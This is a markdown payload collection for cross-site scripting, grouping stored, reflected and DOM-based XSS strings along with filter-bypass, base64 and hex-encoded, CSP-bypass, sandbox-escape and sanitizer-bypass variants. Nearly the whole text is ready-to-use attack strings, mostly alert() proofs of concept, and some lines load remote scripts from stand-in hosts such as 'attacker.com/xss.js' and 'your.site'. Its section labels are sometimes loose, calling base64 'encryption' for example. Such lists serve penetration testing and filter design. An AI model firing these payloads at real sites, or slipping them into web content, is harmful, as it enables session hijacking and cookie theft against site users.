
# XSS Payload Collection

## Overview

Cross-Site Scripting (XSS) is a type of security vulnerability typically found in web applications. It allows attackers to inject malicious scripts into web pages viewed by other users. There are three main types of XSS attacks: Stored XSS, Reflected XSS, and DOM-based XSS. This page provides a comprehensive collection of XSS payloads for each type, including advanced and encrypted payloads for bypassing filters.

## Stored XSS Payloads

Stored XSS occurs when a malicious script is permanently stored on the target server, such as in a database, comment field, or forum post. When a user requests the stored information, the script is executed.

### Basic Payloads

`<script>alert('XSS');</script>` 

`<script>alert(document.cookie);</script>` 

`<img src=x onerror=alert('XSS')>` 

### Advanced Payloads

`<svg/onload=alert('XSS')>` 

`<body onload=alert('XSS')>` 

`<iframe src="javascript:alert('XSS');"></iframe>` 

### Event Handlers


`<div onmouseover="alert('XSS')">Hover over me!</div>` 

`<input type="text" value="XSS" onfocus="alert('XSS')">` 

`<a href="#" onclick="alert('XSS')">Click me</a>` 

### Attribute Injection

`<math><mtext><malignmark><mi><audio autoplay onloadstart=alert('XSS')></audio>` 

`<xss style="xss:expression(alert('XSS'))">` 

`<marquee width=1 loop=1 scrollamount=1 onfinish=confirm(1)>` 

### Filter Bypass Payloads

#### Using Backticks

``<IMG SRC=`javascript:alert("XSS")`>`` 

#### Using Data URIs


`<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">Click here</a>` 

#### Double Encoding


`%253Cscript%253Ealert('XSS')%253C%252Fscript%253E` 

### Encrypted Payloads

#### Base64 Encoding with Execution


`<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></iframe>` 

#### Hex Encoding with Execution


`<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>` 

## Reflected XSS Payloads

Reflected XSS occurs when user-supplied data is immediately returned by a web application without proper validation or escaping. These payloads are often found in URL query parameters.

### Basic Payloads


`"><script>alert('XSS')</script>` 

`"><img src=x onerror=alert('XSS')>` 

`"><svg/onload=alert('XSS')>` 

### URL Encoded Payloads


`%3Cscript%3Ealert('XSS')%3C/script%3E` 

`%3Cimg%20src%3Dx%20onerror%3Dalert('XSS')%3E` 

`%3Csvg%2Fonload%3Dalert('XSS')%3E` 

### Event Handlers

`"><div onmouseover="alert('XSS')">Hover over me!</div>` 

`"><input type="text" value="XSS" onfocus="alert('XSS')">` 


`"><a href="#" onclick="alert('XSS')">Click me</a>` 

### Filter Bypass Payloads

#### Using Backticks

``<IMG SRC=`javascript:alert("XSS")`>`` 

#### Using Data URIs

`<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">Click here</a>` 

#### Double Encoding

`%253Cscript%253Ealert('XSS')%253C%252Fscript%253E` 

### Encrypted Payloads

#### Base64 Encoding with Execution

`<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></iframe>` 

#### Hex Encoding with Execution

`<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>` 

## DOM-based XSS Payloads

DOM-based XSS occurs when the vulnerability is in the client-side code rather than the server-side code. This type of XSS is found in JavaScript that directly manipulates the DOM.

### Basic Payloads

`document.write('<script>alert("XSS")</script>');` 

`document.body.innerHTML = '<img src=x onerror=alert("XSS")>';` 

`location.hash = '"><script>alert("XSS")</script>';` 

### Advanced Payloads

`location="javascript:alert('XSS')";` 

`window.location = 'javascript:alert("XSS")';` 

`document.location = 'javascript:alert("XSS")';` 

### Event Handlers


`var x = document.createElement("div");
x.onmouseover = function() { alert('XSS'); };
document.body.appendChild(x);` 

`document.getElementById('test').setAttribute('onmouseover', 'alert("XSS")');` 

`element.attachEvent('onclick', function(){ alert('XSS'); });` 

### Filter Bypass Payloads

#### Using Backticks

``var img = document.createElement('img');
img.src = `javascript:alert("XSS")`;
document.body.appendChild(img);`` 

#### Using Data URIs

`var a = document.createElement('a');
a.href = 'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=';
a.innerHTML = 'Click me';
document.body.appendChild(a);` 

#### Double Encoding

`var script = document.createElement('script');
script.innerHTML = "eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))";
document.body.appendChild(script);` 

### Encrypted Payloads

#### Base64 Encoding with Execution

`var script = document.createElement('script');
script.src = 'data:text/javascript;base64,YWxlcnQoJ1hTUycp';
document.body.appendChild(script);` 

#### Hex Encoding with Execution

`var script = document.createElement('script');
script.innerHTML = "\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29";
document.body.appendChild(script);` 

## Advanced XSS Payloads

### Polyglot Payloads

Polyglot payloads can be used in multiple contexts, such as HTML, JS, CSS, etc.

`<script src=//your.site/0></script>` 


`"><script src=//your.site/0 onerror=eval(atob('ZG9jdW1lbnQud3JpdGUoJzxzY3JpcHQ+YWxlcnQoJ1hTUycpOzwvc2NyaXB0Pic='))></script>` 

### Filter Bypass Techniques

#### Using Backticks


``<IMG SRC=`javascript:alert("XSS")`>`` 

#### Using Data URIs


`<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">Click here</a>` 

#### Double Encoding

`%253Cscript%253Ealert('XSS')%253C%252Fscript%253E` 

### Payloads for Specific Contexts

#### JSON Context

`{"key":"\u003cscript\u003ealert('XSS')\u003c/script\u003e"}` 

#### XML Context

`<foo><script>alert(1)</script></foo>` 

#### SVG Context

`<svg><script>alert(1)</script></svg>` 

## Advanced XSS Techniques

### Exploiting CSP Bypasses

Content Security Policy (CSP) is a security feature that helps prevent XSS by restricting the sources from which scripts can be loaded.

#### Exploiting CSP with JSONP

`<script src="https://trusted.com/resource?callback=alert(1)"></script>` 

#### Exploiting CSP with DOM Clobbering

`<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></object>` 

### Bypassing Input Sanitization

Some applications use input sanitization techniques that can be bypassed with clever payload crafting.

#### Null Byte Injection

`<script>alert(String.fromCharCode(88,83,83))</script>\0` 

#### Breaking Out of Tags

`"><img src=x onerror=alert('XSS');>` 

#### Chained Injection

`"><script src=https://attacker.com/xss.js></script>` 

### Sandbox Escapes

Some web applications use sandbox iframes or other sandboxing techniques to contain potentially dangerous scripts.

#### Bypassing Sandbox with PostMessage

`<iframe sandbox="allow-scripts" srcdoc="<script>window.parent.postMessage('XSS','*')</script>"></iframe>` 

#### Exploiting Trusted Domains

`<iframe src="https://trusted-domain.com" onload="this.contentWindow.postMessage('<script>alert(1)</script>', '*')"></iframe>` 

### Using Mutation Observers

Mutation Observers can be used to detect and inject scripts when the DOM changes.

#### Example Payload

`var observer = new MutationObserver(function(mutations) {
  mutations.forEach(function(mutation) {
    if (mutation.addedNodes.length) {
      var script = document.createElement('script');
      script.innerHTML = 'alert("XSS")';
      document.body.appendChild(script);
    }
  });
});
observer.observe(document, { childList: true, subtree: true });
document.body.appendChild(document.createElement('div'));` 

### Bypassing HTML Sanitizers

Many applications use libraries to sanitize HTML input, but these can often be bypassed with creative payloads.

#### Using Angle Brackets

`<svg><a xlink:href="javascript:alert(1)">&lt;click&gt;</a></svg>` 

#### Exploiting Weak Sanitizers

`<div><iframe src="javascript:alert('XSS')"></iframe></div>`